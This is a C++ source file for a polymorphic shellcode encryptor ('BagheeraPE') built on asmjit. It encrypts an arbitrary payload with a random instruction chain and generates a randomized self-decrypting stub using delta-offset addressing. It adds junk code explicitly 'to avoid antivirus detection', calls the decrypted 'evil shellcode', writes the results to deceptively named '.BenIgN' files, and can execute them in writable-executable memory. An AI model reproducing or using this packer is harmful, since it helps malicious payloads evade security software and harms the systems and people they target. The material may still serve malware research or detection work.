#include "includes.hpp"
#include "bagheera.hpp"
#include "helpers.h"

using namespace asmjit;
using namespace asmjit::x86;
using namespace std;



/**
 * Sets the registers to be used in the polymorphic phase. The election is done at random.
 */
void BagheeraPE::SelectRegisters()
{
  Gp regsAvailable[] =  {regs::rax, regs::rcx, regs::rdx ,regs::rsi, regs::rdi, regs::r8, regs::r9, regs::r10, regs::r11};

  // shuffle the order to randomize register election
  std::random_shuffle(&regsAvailable[0], &regsAvailable[6]);  

  regSrc = regsAvailable[0];  // will contain pointer to encryted data
  regDst = regsAvailable[1];  // will contain pointer to output buffer (function parameter)
  regSize = regsAvailable[2];  // will contain size of encrypted data buffer
  regKey = regsAvailable[3];  // will contain decryption key
  regData = regsAvailable[4];  // will contain data that is been operated by the decryption function
  regSafe1 = regs::rsi; 
  regSafe2 = regs::rdi; 
  regSafe3 = regs::rbx; 
}


/**
 * Generate decryption function prologue.
 */
void BagheeraPE::GeneratePrologue(x86::Assembler& a)
{

  // save original value of EBP is saved so it can be used to refer to the stack frame. two equivalent options
  /*if (rand()%2 == 0) {
    a.push(rbp);  // push  ebp
    a.mov(rbp, rsp);  // mov  ebp, esp

  } else {
    a.enter(imm(0), imm(0));  // enter  0x0, 0x0
  }*/

  // save sensitive registers. if using stdcall convention, these regs are: ESI, EDI, or EBX
  //a.push(regSafe1);  // push  rsi
  //a.push(regSafe2);  // push  rdi
  //a.push(regSafe3);  // push  rbx
  //a.push(rax);
  //a.ret();
  //a.push(rcx);
  //a.push(rdx);
  //a.push(rsi);
  //a.push(rsp);



  // load the pointer to the output buffer
  a.mov(regDst, rdi);  // mov  regDest, [ebp+0x8]
}


/**
 * Generate code to obtain pointer to encrypted data which is appended at the end of the function.
 */
void BagheeraPE::GenerateDeltaOffset(x86::Assembler& a)
{
  //std::cout << "> Asmjit offset before calling 'delta_offset' is: " << a.offset() << "\n";

  // create the 'delta_offset' label
  lblDeltaOffset = a.newLabel();  
  
  // generate call to the delta_offset label
  a.call(lblDeltaOffset);  // call  delta_offset

  size_t posUnusedCodeStart = a.offset(); // Get the current offset
  //std::cout << "> Asmjit offset after calling 'delta_offset' is: " << posUnusedCodeStart << "\n";

  // random code addition to avoid antivirus detection
  if (rand()%2 == 0)
    a.mov(r10, imm(1));
  else
    a.xor_(r11, r13);
  a.leave();
  a.ret(1 * sizeof(unsigned long));


  dwUnusedCodeSize = static_cast<unsigned long>(a.offset() - posUnusedCodeStart); // calculate size of the unused code
  a.bind(lblDeltaOffset);  // bind the label here
  posDeltaOffset = a.offset();

  // read the stack and get value
  //a.mov(regSrc, ptr(regs::rsp));  // mov  regSrc, [esp]
  //a.add(regs::rsp, imm(4));  // add  esp, 0x4
  a.pop(regSrc);
  //a.sub(regSrc, imm(posDeltaOffset));

  // generate instruction which will be updated later with offset size
  a.long_().add(regSrc, imm(000000));  // add  regSrc, 0x??????????


  // save position of code for later reference
  //posSrcPtr = a.offset();
  posSrcPtr = a.offset() - 4;
  //std::cout << "a.offset()-4: " << posSrcPtr << "\na.offset(): " << posSrcPtr+4 << "\n";
   
}


/**
 * Generate the encryption keys, encryption instructions, and finally encrypt the input data
 */
void BagheeraPE::EncryptInputBuffer(unsigned char * lpInputBuffer, unsigned long dwInputBuffer, 
                                      unsigned long dwMinInstr, unsigned long dwMaxInstr )
{
  // generate encryption key
  dwEncryptionKey = (unsigned long) rand();  
  //DEBUG2("> generated encryption key: ", dwEncryptionKey);

  // round up the size of the input buffer
  unsigned long dwAlignedSize __attribute__ ((aligned)) = (unsigned long) ceil((float)dwInputBuffer / sizeof(unsigned long))*sizeof(unsigned long); 
  //DEBUG2("> size of the input buffer: ", dwInputBuffer);
  //DEBUG2("rounded size of the input buffer: ", dwAlignedSize);
  
  // number of blocks to encrypt
  dwEncryptedBlocks = (unsigned long) ceil((float)dwAlignedSize / sizeof(unsigned long)); 
  //DEBUG2("number of blocks to encrypt: ", dwEncryptedBlocks);

  dwLeftOver = dwAlignedSize - dwInputBuffer;

  // cast input buffer pointer from char to long
  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);
  
  // allocate memory for the output data (rounded to block size)
  if ( posix_memalign((void **)&diEncryptedData, BLOCK_SIZE, dwAlignedSize) ){
    ERROR("could not allocate memory for the output data");
    exit(MUTAGEN_ERR_MEMORY);
  }

  // cast output buffer pointer from char to long
  unsigned long * lpdwOutputBuffer = reinterpret_cast<unsigned long *>(diEncryptedData);

  // randomly select the number of encryption instructions
  dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);
  DEBUG2("number of encryption instructions:", dwCryptOpsCount);

  // allocate memory for an array which will record information about the sequence of encryption instructions
  diCryptOps = (int *)malloc(dwCryptOpsCount);
  if( diCryptOps == NULL ){
    ERROR("could not allocate memory for sequence of encryption instructions array");
    exit(MUTAGEN_ERR_MEMORY);

  }

  // generate encryption instructions and their type. randomly choose the type of encryption instruction
  for (unsigned long i = 0; i < dwCryptOpsCount; i++){
    diCryptOps[i] = (int) rand()%4;
    DEBUG2("diCryptOps: ", diCryptOps[i]);
  }

  // encrypt the input data according to instructions just generated
  for (unsigned long i = 0; i < dwEncryptedBlocks; i++)
  {
    // take the next block for encryption
    unsigned long dwInputBlock = lpdwInputBuffer[i];

    // encryption loop: executes the sequence of encryption instructions on the data block
    for (unsigned long j = 0; j < dwCryptOpsCount; j++)
    {
      // depending on the encryption operation, perform the appropriate modification of the data block
      switch(diCryptOps[j])
      {
      case SPE_CRYPT_OP_ADD:
        dwInputBlock += dwEncryptionKey;
        break;
      case SPE_CRYPT_OP_SUB:
        dwInputBlock -= dwEncryptionKey;
        break;
      case SPE_CRYPT_OP_XOR:
        dwInputBlock ^= dwEncryptionKey;
        break;
      case SPE_CRYPT_OP_NOT:
        dwInputBlock = ~dwInputBlock;
        break;
      case SPE_CRYPT_OP_NEG:
        dwInputBlock = 0L - dwInputBlock;
        break;
      }
    }
    // store the encrypted block in the buffer
    lpdwOutputBuffer[i] = dwInputBlock;
  }
}

/**
 * Set up the keys which will be used to decrypt the data in the apropiate registers
 */
void BagheeraPE::SetupDecryptionKeys(x86::Assembler& a)
{
  
  unsigned long dwKeyModifier = (unsigned long) rand();

  
  switch(rand()%2)
  {
  case 0:
    a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
    a.add(regKey, imm(dwKeyModifier));
    break;
  case 1:
    a.mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
    a.sub(regKey, imm(dwKeyModifier));
    break;
  case 2:
    a.mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
    a.xor_(regKey, imm(dwKeyModifier));
    break;
  }
}


/**
 *  generate the decryption code (for the main decryption loop)
 */
void BagheeraPE::GenerateDecryption(x86::Assembler& a)
{
  // set up the size of the encrypted data (in blocks)
  a.mov(regSize, imm(dwEncryptedBlocks));

  // create a label for the start of the decryption loop
  Label lblDecryptionLoop = a.newLabel();
  a.bind(lblDecryptionLoop);

  // read the data referred to by the regSrc register
  a.mov(regData, qword_ptr(regSrc));

  // build the decryption code by generating each decryption instruction in reverse
  for (int i = dwCryptOpsCount - 1; i != -1; i--)
  {
      switch(diCryptOps[i])
      {
      case SPE_CRYPT_OP_ADD:
        DEBUG("sub");
        a.sub(regData, regKey);
        break;
      case SPE_CRYPT_OP_SUB:
        DEBUG("add");
        a.add(regData, regKey);
        break;
      case SPE_CRYPT_OP_XOR:
        DEBUG("xor");
        a.xor_(regData, regKey);
        break;
      case SPE_CRYPT_OP_NOT:
        DEBUG("not");
        a.not_(regData);
        break;
      case SPE_CRYPT_OP_NEG:
        DEBUG("neg");
        a.neg(regData);
        break;
      }
    }
  

  // write the decrypted block to the output buffer
  a.mov(qword_ptr(regDst), regData);
  a.mov(qword_ptr(regSrc), regData);

  // update the pointers to the input and ouput buffers to point to the next block
  a.add(regSrc, imm(sizeof(unsigned long)));
  a.add(regDst, imm(sizeof(unsigned long)));

  // decrement the loop counter (the number of blocks remaining to decrypt)
  a.dec(regSize);

  // check if the loop is finished if not, jump to the start
  a.jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void BagheeraPE::SetupOutputRegisters(unsigned long returnValue, x86::Assembler& a)
{
  a.mov(rax, imm(returnValue));
  /*
  // if there are no output registers to set up, return
  if ((regOutput == NULL) || (dwCount == 0))
    return;

  // shuffle the order in which the registers will be set up
  std::random_shuffle(&regOutput[0], &regOutput[dwCount]);

  // generate instructions to set up the output registers
  for (unsigned long i = 0; i < dwCount; i++)
    a.mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
  */
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void BagheeraPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a)
{
  // restore the original values of registers ESI EDI EBX
  //a.pop(regSafe3);
  //a.pop(regSafe2);
  //a.pop(regSafe1);
  //a.pop(rsp);
  //a.pop(rsi);
  //a.pop(rdx);
  //a.pop(rcx);

  // restore the value of EBP
  /*if (rand()%2 == 0)
  {
    a.leave();
  }
  else
  {
    a.mov(regs::rsp,regs::rbp);
    a.pop(regs::rbp);
  }
  */

  
  // Call evil shellcode
  shellcode = a.newLabel();
  a.call(shellcode);

  // return to the code which called our function; additionally adjust the stack by the size of the passed
  // parameters (by stdcall convention)
  a.ret(0);
}


/**
 * align the size of the decryption function to the specified granularity
 */
void BagheeraPE::AlignDecryptorBody(unsigned long dwAlignment, x86::Assembler& a, CodeHolder& code)
{
  a.align(kAlignCode, dwAlignment);
}


/**
 * correct all instructions making use of addressing relative to the delta offset
 * reference: https://asmjit.com/doc/classasmjit_1_1x86_1_1Assembler.html  section: Using x86::Assembler as Code-Patcher
 */
void BagheeraPE::UpdateDeltaOffsetAddressing(x86::Assembler& a)
{

  // Get current position
  size_t current_position = a.offset(); 
  
  // Calculate the offset to the encrypted data
  unsigned long dwAdjustSize = static_cast<unsigned long>(current_position - posDeltaOffset);

  // Go to place where reference to encrypted data is made
  a.setOffset(posSrcPtr); 

  // Update the instruction with proper direction
  a.db(dwAdjustSize + dwUnusedCodeSize);

  // Return to position we where in previous to the patch
  a.setOffset(current_position); 
}


/**
 * append the encrypted data to the end of the code of the decryption function
 */
void BagheeraPE::AppendEncryptedData(x86::Assembler& a)
{
  unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);

  a.bind(shellcode);
  // place the encrypted data buffer at the end of the decryption function (in 4-unsigned char blocks)
  for (unsigned long i = 0; i < dwEncryptedBlocks; i++){
    a.dq(lpdwEncryptedData[i]);
  }
}


void BagheeraPE::WriteToFile(void *lpcDecryptionProc, unsigned long dwDecryptionProcSize)
{
  std::string filename = "bins/not_gonna_harm_your_pc_";
  //std::string filenum = std::to_string(rand()%10);
  //std::string extension = ".BenIgN";
  filename += std::to_string(rand()%100);
  filename += ".BenIgN";

  FILE *hFile = fopen(filename.c_str(), "wb");

  if (hFile != NULL)
  {
    DEBUG("opening output file successful");
    fwrite(lpcDecryptionProc, dwDecryptionProcSize, 1, hFile);
    fclose(hFile);
    DEBUG("writting successful");
  }


}

///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

int BagheeraPE::create( unsigned char * lpInputBuffer, unsigned long dwInputBuffer, char * *lpOutputBuffer, \
                          unsigned long * lpdwOutputSize )
{
  DEBUG("calling main function");
  
  // check input errors
  if ( (lpInputBuffer == NULL) || (dwInputBuffer == 0) ||  (lpOutputBuffer == NULL) || (lpdwOutputSize == NULL) )
    return MUTAGEN_ERR_PARAMS;
  
  JitRuntime rt;                // Create a runtime specialized for JIT
  CodeHolder code;              // Create a CodeHolder
  code.init(rt.environment());  // Initialize code to match the JIT environment
  Assembler a(&code);           // Create and attach x86::Assembler to code
  code.setLogger(&logger);      // Attach the `logger` to `code` holder
  
  FILE *logfile = fopen("log/asmjt.log", "w+");

  if (logfile != NULL) {
    logger.setFile(logfile);  // Set file as the logger exit
  } else {
    ERROR("could not open asmjit.log file. redirecting log to stdout");
    logger.setFile(stdout);  // Set the standard output as the logger exit
  }

  
  DEBUG("randomly select registers");
  SelectRegisters();


  DEBUG("generate function prologue");
  GeneratePrologue(a);

  DEBUG("set up relative addressing through the delta offset technique");
  GenerateDeltaOffset(a);

  // encrypt the input data, generate encryption keys. the additional parameters set the lower and upper limits on the 
  // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
  // numbers in the thousands, but be aware that this will make the output code quite large)
  DEBUG("encrypt the input data");
  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 5, 7);

  DEBUG("generate code to set up keys for decryption");
  SetupDecryptionKeys(a);
  

  DEBUG("generate decryption code");
  GenerateDecryption(a);

  DEBUG("set up the values of the output registers");
  SetupOutputRegisters(dwInputBuffer, a);

  DEBUG("generate function epilogue");
  GenerateEpilogue(1L, a);

  DEBUG("align the size of the function to a multiple of 4 or 16");
  AlignDecryptorBody(rand()%2 == 0 ? 4L : 16L, a, code);

  DEBUG("fix up any instructions that use delta offset addressing");
  UpdateDeltaOffsetAddressing(a);

  DEBUG("place the encrypted data at the end of the function");
  AppendEncryptedData(a);


  // free the encrypted data buffer
  //free(&diEncryptedData);

  // free the array of encryption pseudoinstructions
  //free(&diCryptOps);
  
  ///////////////////////////////////////////////////////////
  //
  // copy the polymorphic code to the output buffer
  //
  ///////////////////////////////////////////////////////////

  unsigned long dwOutputSize = code.codeSize();
  
  // assemble the code of the polymorphic function (this resolves jumps and labels)
  DEBUG("assembling code and binding to a function");
  DecryptionProc lpPolymorphicCode;
  Error err = rt.add(&lpPolymorphicCode, &code);
  if (err) return 1;                // Handle a possible error returned by AsmJit.

  // this struct describes the allocated memory block
  DEBUG("allocating memory for the execution of the function");
  void *diOutput = mmap(0, dwOutputSize, 
                   PROT_READ | PROT_WRITE ,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (diOutput == (void*)-1) {
    ERROR("allocating executable memory for function");
    exit(MUTAGEN_ERR_MEMORY);
  }

  // allocate memory (with execute permissions) for the output buffer
  //int pagesize = sysconf(_SC_PAGE_SIZE);
  //int aligned_size = ceil((double)dwOutputSize/(double)pagesize);
  //std::cout << "pagesize: " << pagesize << "\n";
  //std::cout << "aligned_size: " << aligned_size << "\n";
  //std::cout << "dwOutputSize: " << dwOutputSize << "\n";
  //std::cout << "aligned_dwOutputSize: " << aligned_size*pagesize << "\n";
  //posix_memalign((void **)&diOutput, pagesize, aligned_size*pagesize);

  DEBUG("making the memory page(s) of the function executable");
  if (mprotect(diOutput, dwOutputSize, PROT_EXEC|PROT_READ|PROT_WRITE) == -1){
    ERROR("could not make output buffer's page executable");
    exit(MUTAGEN_ERR_MEMORY);
  }

  // check that allocation was successful
  if (diOutput != NULL)
  {
    // copy the generated code of the decryption function
    DEBUG("copying to memory the function code");
    //memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
    asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
    memcpy(diOutput, buf.data(), buf.size());



    // provide the output buffer and code size to
    // this function's caller
    *lpOutputBuffer = (char *)diOutput;
    *lpdwOutputSize = dwOutputSize;

    cout << INFO_BANNER << ": lpOutputBuffer = " << lpOutputBuffer << endl;
    cout << INFO_BANNER << ": *lpOutputBuffer = " << hex << *lpOutputBuffer << dec << endl;
    /*
    for (int i = 0; i < *lpdwOutputSize; ++i){
      cout << "?¿";
      cout << hex << (*lpOutputBuffer[i]) << " "; 
    }
    cout<< endl;
    */
    cout << INFO_BANNER << ": lpdwOutputSize = " << lpdwOutputSize << endl;
    cout << INFO_BANNER << ": *lpdwOutputSize = " << *lpdwOutputSize << endl;




    DEBUG("writing the code to a function");
    WriteToFile(diOutput, dwOutputSize);

    /*
    DEBUG("creating output buffer for the function");
    
    char* szOutputBuffer;
    szOutputBuffer = (char*) malloc(dwInputBuffer);
    if (szOutputBuffer == NULL) {
      ERROR("could not allocate memory for output buffer for the decrypted data");
      exit(MUTAGEN_ERR_MEMORY);
    } 
    
    DecryptionProc function = reinterpret_cast<DecryptionProc>(diOutput);

    // call the decryption function via its function pointer
    //DecryptionProc function = reinterpret_cast<DecryptionProc>(lpOutputBuffer);
    DEBUG("calling function");
    unsigned long dwOutputSize = function(szOutputBuffer);

    // display the decrypted text
    printf("Payload (%lu) : %s\n", dwOutputSize, szOutputBuffer );
    std::cout << "Payload (" << dwOutputSize << ") : ";
    for (int i = 0; i < (int) dwOutputSize; ++i)
     cout << hex << static_cast<unsigned>(szOutputBuffer[i]) << " "; 
   cout<< endl;
  
  */
  
    
    rt.release(lpPolymorphicCode);
  }
  else
  {
    ERROR("could not allocate memory for output file");
    rt.release(lpPolymorphicCode);

    return MUTAGEN_ERR_MEMORY;
  }

  ///////////////////////////////////////////////////////////
  //
  // function exit
  //
  ///////////////////////////////////////////////////////////

  return MUTAGEN_ERR_SUCCESS;
}




///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

int BagheeraPE::execute( unsigned char * lpInputBuffer, unsigned long dwInputBuffer )
{
  DEBUG("calling main function");
  
  // check input errors
  if ( (lpInputBuffer == NULL) || (dwInputBuffer == 0)  )
    return MUTAGEN_ERR_PARAMS;
  
  JitRuntime rt;                // Create a runtime specialized for JIT
  CodeHolder code;              // Create a CodeHolder
  code.init(rt.environment());  // Initialize code to match the JIT environment
  Assembler a(&code);           // Create and attach x86::Assembler to code
  code.setLogger(&logger);      // Attach the `logger` to `code` holder
  
  FILE *logfile = fopen("log/asmjt.log", "w+");

  if (logfile != NULL) {
    logger.setFile(logfile);  // Set file as the logger exit
  } else {
    ERROR("could not open asmjit.log file. redirecting log to stdout");
    logger.setFile(stdout);  // Set the standard output as the logger exit
  }
 
  DEBUG("randomly select registers");
  SelectRegisters();

  DEBUG("generate function prologue");
  GeneratePrologue(a);

  DEBUG("set up relative addressing through the delta offset technique");
  GenerateDeltaOffset(a);

  // encrypt the input data, generate encryption keys. the additional parameters set the lower and upper limits on the 
  // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
  // numbers in the thousands, but be aware that this will make the output code quite large)
  DEBUG("encrypt the input data");
  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 5, 7);

  DEBUG("generate code to set up keys for decryption");
  SetupDecryptionKeys(a);
  
  DEBUG("generate decryption code");
  GenerateDecryption(a);

  DEBUG("set up the values of the output registers");
  SetupOutputRegisters(dwInputBuffer, a);

  DEBUG("generate function epilogue");
  GenerateEpilogue(1L, a);

  DEBUG("align the size of the function to a multiple of 4 or 16");
  AlignDecryptorBody(rand()%2 == 0 ? 4L : 16L, a, code);

  DEBUG("fix up any instructions that use delta offset addressing");
  UpdateDeltaOffsetAddressing(a);

  DEBUG("place the encrypted data at the end of the function");
  AppendEncryptedData(a);


  // free the encrypted data buffer
  //free(&diEncryptedData);

  // free the array of encryption pseudoinstructions
  //free(&diCryptOps);
  
  ///////////////////////////////////////////////////////////
  //
  // copy the polymorphic code to the output buffer
  //
  ///////////////////////////////////////////////////////////

  unsigned long dwOutputSize = code.codeSize();
  
  // assemble the code of the polymorphic function (this resolves jumps and labels)
  DEBUG("assembling code and binding to a function");
  DecryptionProc lpPolymorphicCode;
  Error err = rt.add(&lpPolymorphicCode, &code);
  if (err) return 1;                // Handle a possible error returned by AsmJit.

  // this struct describes the allocated memory block
  DEBUG("allocating memory for the execution of the function");
  void *diOutput = mmap(0, dwOutputSize, 
                   PROT_READ | PROT_WRITE ,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (diOutput == (void*)-1) {
    ERROR("allocating executable memory for function");
    exit(MUTAGEN_ERR_MEMORY);
  }

  // allocate memory (with execute permissions) for the output buffer
  //int pagesize = sysconf(_SC_PAGE_SIZE);
  //int aligned_size = ceil((double)dwOutputSize/(double)pagesize);
  //std::cout << "pagesize: " << pagesize << "\n";
  //std::cout << "aligned_size: " << aligned_size << "\n";
  //std::cout << "dwOutputSize: " << dwOutputSize << "\n";
  //std::cout << "aligned_dwOutputSize: " << aligned_size*pagesize << "\n";
  //posix_memalign((void **)&diOutput, pagesize, aligned_size*pagesize);

  DEBUG("making the memory page(s) of the function executable");
  if (mprotect(diOutput, dwOutputSize, PROT_EXEC|PROT_READ|PROT_WRITE) == -1){
    ERROR("could not make output buffer's page executable");
    exit(MUTAGEN_ERR_MEMORY);
  }

  // check that allocation was successful
  if (diOutput != NULL)
  {
    // copy the generated code of the decryption function
    DEBUG("copying to memory the function code");
    //memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
    asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
    memcpy(diOutput, buf.data(), buf.size());

    DEBUG("writing the code to a function");
    WriteToFile(diOutput, dwOutputSize);

    DEBUG("creating output buffer for the function");
    
    char* szOutputBuffer;
    szOutputBuffer = (char*) malloc(dwInputBuffer);
    if (szOutputBuffer == NULL) {
      ERROR("could not allocate memory for output buffer for the decrypted data");
      exit(MUTAGEN_ERR_MEMORY);
    } 
    
    DecryptionProc function = reinterpret_cast<DecryptionProc>(diOutput);

    // call the decryption function via its function pointer
    //DecryptionProc function = reinterpret_cast<DecryptionProc>(lpOutputBuffer);
    DEBUG("calling function");
    unsigned long dwOutputSize = function(szOutputBuffer);

    // display the decrypted text
    printf("Payload (%lu) : %s\n", dwOutputSize, szOutputBuffer );
    std::cout << "Payload (" << dwOutputSize << ") : ";
    for (int i = 0; i < (int) dwOutputSize; ++i)
     cout << hex << static_cast<unsigned>(szOutputBuffer[i]) << " "; 
   cout<< endl;

  
    
    rt.release(lpPolymorphicCode);
  }
  else
  {
    ERROR("could not allocate memory for output file");
    rt.release(lpPolymorphicCode);

    return MUTAGEN_ERR_MEMORY;
  }

  ///////////////////////////////////////////////////////////
  //
  // function exit
  //
  ///////////////////////////////////////////////////////////

  return MUTAGEN_ERR_SUCCESS;
}

